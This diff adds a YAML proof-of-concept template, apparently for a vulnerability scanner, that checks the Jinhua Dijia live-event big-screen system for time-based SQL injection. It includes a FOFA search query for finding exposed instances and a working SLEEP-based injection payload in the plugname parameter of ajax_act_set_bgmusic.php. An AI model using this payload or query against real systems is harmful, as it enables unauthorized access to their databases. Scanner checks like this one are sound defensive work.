@@ -1,0 +1,17 @@
+id: poc-yaml-deejia-ajax-act-set-bgmusic-sqli
+info:
+  name: 金华迪加现场大屏互动系统 ajax_act_set_bgmusic SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金华迪加现场大屏互动系统
+  fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /wall/ajax_act_set_bgmusic.php?bgmusicstatus=1&plugname=%22XOR(if(now()=sysdate(),SLEEP({{.t1}}),0))XOR%22Z
+  expression: status_code == 200 && body == `{"ret":1}` && duration > t1 && duration
+    < t2
+transport: http
